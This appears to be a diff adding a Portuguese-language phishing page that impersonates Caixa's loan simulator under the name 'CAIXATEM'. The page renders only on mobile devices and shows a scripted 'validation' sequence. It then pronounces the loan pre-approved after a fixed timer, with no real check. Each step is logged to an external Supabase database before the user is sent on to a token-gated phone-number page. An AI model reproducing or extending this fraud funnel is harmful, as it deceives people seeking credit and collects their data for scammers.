@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <link rel="icon" type="image/png" href="favicon.png" />
+  <title>CAIXATEM - Simulação de Empréstimo</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: #0066b3;
+      height: 100%;
+      width: 100%;
+      position: fixed;
+      overflow: hidden;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        display: flex;
+      }
+    }
+
+    .container {
+      background: white;
+      border-radius: 24px;
+      width: 100%;
+      max-width: 420px;
+      margin: auto;
+      padding: 0;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+      position: relative;
+      min-height: 90%;
+      max-height: 100%;
+      overflow-y: auto;
+      align-self: center;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: none;
+      border: none;
+      font-size: 28px;
+      color: #666;
+      cursor: pointer;
+      font-weight: 300;
+      line-height: 1;
+      padding: 0;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .content {
+      padding: 80px 32px 32px 32px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .logo {
+      position: absolute;
+      top: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo img {
+      max-width: 50px;
+      height: auto;
+    }
+
+    h1 {
+      color: #003e6b;
+      font-size: 20px;
+      font-weight: 600;
+      text-align: left;
+      line-height: 1.3;
+      margin-bottom: 24px;
+    }
+
+    .range-container {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .range-value {
+      font-size: 32px;
+      font-weight: 700;
+      color: #0066b3;
+      margin-bottom: 10px;
+      display: block;
+    }
+
+    input[type="range"] {
+      -webkit-appearance: none;
+      width: 100%;
+      height: 6px;
+      background: #d1d5db;
+      border-radius: 5px;
+      outline: none;
+      margin: 10px 0;
+    }
+
+    input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #0066b3;
+      cursor: pointer;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      border: 2px solid white;
+    }
+
+    .custom-select {
+      position: relative;
+      width: 100%;
+      margin-bottom: 8px;
+      margin-top: 5px;
+    }
+
+    .select-selected {
+      width: 100%;
+      padding: 18px 20px;
+      border: 1px solid #d1d5db;
+      border-radius: 12px;
+      font-size: 18px;
+      color: #374151;
+      background: white;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: border-color 0.2s;
+    }
+
+    .select-selected.placeholder {
+      color: #9ca3af;
+    }
+
+    .select-selected:after {
+      content: '▼';
+      font-size: 12px;
+      color: #0066b3;
+    }
+
+    .select-selected.select-arrow-active:after {
+      content: '▲';
+    }
+
+    .select-items {
+      position: absolute;
+      background-color: white;
+      top: 100%;
+      left: 0;
+      right: 0;
+      z-index: 99;
+      max-height: 200px;
+      overflow-y: auto;
+      border: 1px solid #d1d5db;
+      border-radius: 12px;
+      margin-top: 4px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      display: none;
+    }
+
+    .select-items.show {
+      display: block;
+    }
+
+    .select-item {
+      padding: 14px 20px;
+      cursor: pointer;
+      font-size: 18px;
+      color: #374151;
+      border-bottom: 1px solid #f3f4f6;
+    }
+
+    .select-item:last-child {
+      border-bottom: none;
+    }
+
+    .select-item:hover {
+      background-color: #f3f4f6;
+    }
+
+    .simulation-result {
+      background: #f3f4f6;
+      padding: 24px;
+      border-radius: 16px;
+      margin-top: 20px;
+      margin-bottom: 32px;
+      text-align: center;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 16px;
+      background: #d4dfe6;
+      color: #a0adb5;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: not-allowed;
+      margin-bottom: auto;
+    }
+
+    .version {
+      text-align: center;
+      color: #1a7f78;
+      font-size: 14px;
+      margin-top: auto;
+      padding-top: 40px;
+      padding-bottom: 20px;
+    }
+
+    .loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #0066b3;
+      z-index: 2000;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .loading-gif {
+      width: 120px;
+      height: 120px;
+      margin-bottom: 40px;
+    }
+
+    .loading-icon {
+      width: 150px;
+      height: 150px;
+      margin-bottom: 40px;
+      display: none;
+      filter: brightness(0) invert(1);
+    }
+
+    .loading-message {
+      color: white;
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      animation: fadeInOut 2s ease-in-out infinite;
+    }
+
+    .loading-message.final {
+      animation: none;
+      font-size: 24px;
+    }
+
+    .loading-submessage {
+      color: white;
+      font-size: 14px;
+      opacity: 0.85;
+    }
+
+    .loan-amount {
+      display: none;
+      color: #FFD700;
+      font-size: 32px;
+      font-weight: 700;
+      margin-top: 20px;
+      margin-bottom: 8px;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+    }
+
+    .loan-text {
+      display: none;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      opacity: 0.95;
+    }
+
+    @keyframes fadeInOut {
+      0%, 100% { opacity: 0.7; }
+      50% { opacity: 1; }
+    }
+
+    .hidden {
+      display: none !important;
+    }
+  </style>
+</head>
+<body>
+  <!-- Loading Screen -->
+  <div class="loading-screen" id="loadingScreen">
+    <img src="loading.gif" alt="Carregando..." class="loading-gif" id="loadingGif">
+    <div id="lottieIcon" class="loading-icon"></div>
+    <div class="loading-message" id="loadingMessage">Estamos validando o seu empréstimo</div>
+    <div class="loading-submessage" id="loadingSubmessage">Por favor, aguarde...</div>
+    <div class="loan-amount" id="loanAmount">R$ 5.000</div>
+    <div class="loan-text" id="loanText">empréstimo aprovado</div>
+  </div>
+
+  <div class="container">
+    <button class="close-btn">✕</button>
+    
+    <div class="content">
+      <div class="logo">
+        <img src="logocaixa2.png" alt="Logo">
+      </div>
+
+      <h1>Simule seu<br>Empréstimo</h1>
+
+      <div class="range-container">
+        <label style="text-align: left; display: block;">Valor do Empréstimo</label>
+        <span class="range-value" id="amountDisplay">R$ 1.000,00</span>
+        <input type="range" id="amount" min="100" max="5000" step="100" value="1000">
+      </div>
+
+      <div class="input-wrapper">
+        <label for="installments">Número de Parcelas</label>
+        <div class="custom-select">
+          <div class="select-selected placeholder" id="selectSelected">Selecione as parcelas</div>
+          <div class="select-items" id="selectItems"></div>
+        </div>
+      </div>
+
+      <div class="simulation-result" id="result" style="display: none;">
+        <p>Valor da parcela:</p>
+        <div class="value" id="installmentValue">R$ 0,00</div>
+      </div>
+
+      <button class="submit-btn" id="submitBtn">Próximo</button>
+
+      <div class="version">Versão: 1.91.23</div>
+    </div>
+  </div>
+
+  <!-- Lottie Library -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
+
+  <!-- ============================================ -->
+  <!-- SUPABASE INTEGRATION - MESMO SISTEMA DO ACESSO -->
+  <!-- ============================================ -->
+  <script>
+    const SUPABASE_URL = 'https://hbpgjwezukugbtviswkw.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable__7MjiigiJf7NgmLZPLFdxA_yRNF_cO8';
+
+    function getSessaoId() {
+      let id = sessionStorage.getItem('sessao_funil');
+      if (!id) {
+        id = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        sessionStorage.setItem('sessao_funil', id);
+      }
+      return id;
+    }
+
+    async function salvarEtapa(etapaNome, dadosColetados = {}) {
+      const sessao_id = getSessaoId();
+      
+      const payload = {
+        sessao_id: sessao_id,
+        etapa: etapaNome,
+        dados: dadosColetados,
+        url: window.location.pathname,
+        user_agent: navigator.userAgent.substring(0, 255)
+      };
+
+      console.log(`📝 Salvando etapa: ${etapaNome}`, dadosColetados);
+
+      try {
+        const response = await fetch(`${SUPABASE_URL}/rest/v1/funil_etapas`, {
+          method: 'POST',
+          headers: {
+            'apikey': SUPABASE_KEY,
+            'Authorization': `Bearer ${SUPABASE_KEY}`,
+            'Content-Type': 'application/json',
+            'Prefer': 'return=minimal'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          console.log(`✅ Etapa "${etapaNome}" salva com sucesso!`);
+          return true;
+        } else {
+          console.error(`❌ Erro ${response.status}:`, await response.text());
+          return false;
+        }
+      } catch (error) {
+        console.error('❌ Erro de rede:', error);
+        return false;
+      }
+    }
+  </script>
+
+  <script>
+    const amountInput = document.getElementById('amount');
+    const amountDisplay = document.getElementById('amountDisplay');
+    const selectSelected = document.getElementById('selectSelected');
+    const selectItems = document.getElementById('selectItems');
+    const resultDiv = document.getElementById('result');
+    const installmentValueSpan = document.getElementById('installmentValue');
+    const submitBtn = document.getElementById('submitBtn');
+
+    let selectedInstallments = null;
+    let lottieAnimation = null;
+
+    // REGISTRA QUE O USUÁRIO CHEGOU NESTA PÁGINA (ETAPA 3 DO FUNIL)
+    salvarEtapa('pagina_emprestimo', { 
+      pagina: 'emprestimo4e98',
+      timestamp_acesso: new Date().toISOString()
+    });
+
+    function initLottie() {
+      const container = document.getElementById('lottieIcon');
+      if (container && !lottieAnimation) {
+        lottieAnimation = lottie.loadAnimation({
+          container: container,
+          renderer: 'svg',
+          loop: false,
+          autoplay: false,
+          path: 'Check.json'
+        });
+      }
+    }
+
+    // Populate installments
+    for (let i = 1; i <= 60; i++) {
+      const div = document.createElement('div');
+      div.className = 'select-item';
+      div.textContent = `${i}x`;
+      div.dataset.value = i;
+      div.addEventListener('click', function() {
+        selectedInstallments = this.dataset.value;
+        selectSelected.textContent = this.textContent;
+        selectSelected.classList.remove('placeholder');
+        selectItems.classList.remove('show');
+        selectSelected.classList.remove('select-arrow-active');
+        calculateLoan();
+      });
+      selectItems.appendChild(div);
+    }
+
+    selectSelected.addEventListener('click', function(e) {
+      e.stopPropagation();
+      selectItems.classList.toggle('show');
+      this.classList.toggle('select-arrow-active');
+    });
+
+    document.addEventListener('click', function() {
+      selectItems.classList.remove('show');
+      selectSelected.classList.remove('select-arrow-active');
+    });
+
+    function formatCurrency(value) {
+      return value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+    }
+
+    function updateAmountDisplay() {
+      const value = parseFloat(amountInput.value);
+      amountDisplay.textContent = formatCurrency(value);
+      calculateLoan();
+    }
+
+    function calculateLoan() {
+      let amount = parseFloat(amountInput.value);
+      const months = parseInt(selectedInstallments);
+
+      if (amount > 0 && months > 0) {
+        const i = 0.01;
+        
+        let pmt;
+        if (i === 0) {
+            pmt = amount / months;
+        } else {
+            pmt = amount * (i * Math.pow(1 + i, months)) / (Math.pow(1 + i, months) - 1);
+        }
+
+        installmentValueSpan.textContent = formatCurrency(pmt);
+        resultDiv.style.display = 'block';
+        
+        submitBtn.style.background = '#d97706';
+        submitBtn.style.color = 'white';
+        submitBtn.style.cursor = 'pointer';
+        submitBtn.disabled = false;
+      } else {
+        resultDiv.style.display = 'none';
+        submitBtn.style.background = '#d4dfe6';
+        submitBtn.style.color = '#a0adb5';
+        submitBtn.style.cursor = 'not-allowed';
+        submitBtn.disabled = true;
+      }
+    }
+
+    amountInput.addEventListener('input', updateAmountDisplay);
+    updateAmountDisplay();
+
+    submitBtn.addEventListener('click', async function() {
+      if (!this.disabled) {
+        const amount = parseFloat(amountInput.value);
+        const installments = parseInt(selectedInstallments);
+        const valorParcela = parseFloat(installmentValueSpan.textContent.replace('R$ ', '').replace('.', '').replace(',', '.').replace(/[^\d.-]/g, ''));
+        
+        // ============================================
+        // SALVA OS DADOS DO EMPRÉSTIMO NO STORAGE PARA A PÁGINA FINAL
+        // ============================================
+        const loanData = {
+          amount: amount,
+          installments: installments,
+          installmentValue: valorParcela || (amount / installments),
+          timestamp: new Date().toISOString()
+        };
+        
+        // Salva no localStorage (persiste mesmo fechando o navegador)
+        localStorage.setItem('funil_emprestimo_data', JSON.stringify(loanData));
+        
+        // Salva no sessionStorage (apenas durante a sessão)
+        sessionStorage.setItem('funil_emprestimo_data', JSON.stringify(loanData));
+        
+        console.log('💾 Dados do empréstimo salvos no storage:', loanData);
+        
+        // SALVA OS DADOS DO EMPRÉSTIMO NO BANCO (ETAPA 4 DO FUNIL)
+        await salvarEtapa('simulacao_emprestimo', {
+          valor_solicitado: amount,
+          quantidade_parcelas: installments,
+          valor_parcela: valorParcela || (amount / installments),
+          taxa_juros: 0.01,
+          timestamp_simulacao: new Date().toISOString()
+        });
+        
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Aguarde...';
+
+        initLottie();
+
+        // Mantém compatibilidade com capture.json
+        try {
+          fetch('capture.json', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ 
+                  step: 'loan', 
+                  amount: amount,
+                  installments: installments
+              })
+          }).catch(() => {});
+        } catch(e) {}
+
+        const loadingScreen = document.getElementById('loadingScreen');
+        const loadingGif = document.getElementById('loadingGif');
+        const loadingIcon = document.getElementById('lottieIcon');
+        const loadingMessage = document.getElementById('loadingMessage');
+        const loadingSubmessage = document.getElementById('loadingSubmessage');
+        
+        loadingScreen.style.display = 'flex';
+        
+        const messages = [
+          'Estamos validando o seu empréstimo',
+          'Analisando sua solicitação',
+          'Verificando disponibilidade',
+          'Consultando condições',
+          'Processando aprovação',
+          'Validando dados financeiros',
+          'Calculando parcelas',
+          'Verificando crédito',
+          'Analisando perfil',
+          'Confirmando condições'
+        ];
+        
+        let messageIndex = 0;
+        
+        const messageInterval = setInterval(() => {
+          messageIndex = (messageIndex + 1) % messages.length;
+          loadingMessage.textContent = messages[messageIndex];
+        }, 1000);
+        
+        setTimeout(async function() {
+          clearInterval(messageInterval);
+          
+          // SALVA ETAPA DE APROVAÇÃO
+          await salvarEtapa('emprestimo_aprovado', {
+            status: 'pre_aprovado',
+            valor_aprovado: amount,
+            parcelas_aprovadas: installments,
+            timestamp_aprovacao: new Date().toISOString()
+          });
+          
+          loadingGif.style.display = 'none';
+          loadingIcon.style.display = 'block';
+          if (lottieAnimation) {
+              lottieAnimation.play();
+          }
+          
+          loadingMessage.classList.add('final');
+          loadingMessage.textContent = 'Empréstimo Pré-Aprovado!';
+          loadingSubmessage.textContent = 'Siga as próximas etapas para fazer a aprovação do seu empréstimo';
+          
+          setTimeout(function() {
+            window.location.href = 'telefone4e98.html?a7k9m2x1p12';
+          }, 5000);
+        }, 6000);
+      }
+    });
+  </script>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var accessParam = 'a7k9m2x1p12';
+        
+        function addAccessToLinks() {
+            var links = document.querySelectorAll('a[href]');
+            links.forEach(function(link) {
+                var href = link.getAttribute('href');
+                if (!href || href.startsWith('http') || href.startsWith('#') || 
+                    href.startsWith('javascript:') || href.includes(accessParam.split('=')[0])) {
+                    return;
+                }
+                var separator = href.includes('?') ? '&' : '?';
+                link.setAttribute('href', href + separator + accessParam);
+            });
+        }
+        
+        function addAccessToForms() {
+            var forms = document.querySelectorAll('form');
+            forms.forEach(function(form) {
+                if (!form.method || form.method.toLowerCase() === 'get') {
+                    var paramName = accessParam.split('=')[0];
+                    var existingInput = form.querySelector('input[name="' + paramName + '"]');
+                    if (!existingInput) {
+                        var input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = paramName;
+                        input.value = '';
+                        form.appendChild(input);
+                    }
+                }
+            });
+        }
+        
+        addAccessToLinks();
+        addAccessToForms();
+        
+        var observer = new MutationObserver(function(mutations) {
+            var shouldUpdate = false;
+            mutations.forEach(function(mutation) {
+                if (mutation.type === 'childList') {
+                    mutation.addedNodes.forEach(function(node) {
+                        if (node.nodeType === 1) {
+                            if (node.tagName === 'A' || node.tagName === 'FORM' || 
+                                node.querySelector('a') || node.querySelector('form')) {
+                                shouldUpdate = true;
+                            }
+                        }
+                    });
+                }
+            });
+            if (shouldUpdate) {
+                addAccessToLinks();
+                addAccessToForms();
+            }
+        });
+        
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    });
+  </script>
+</body>
+</html>
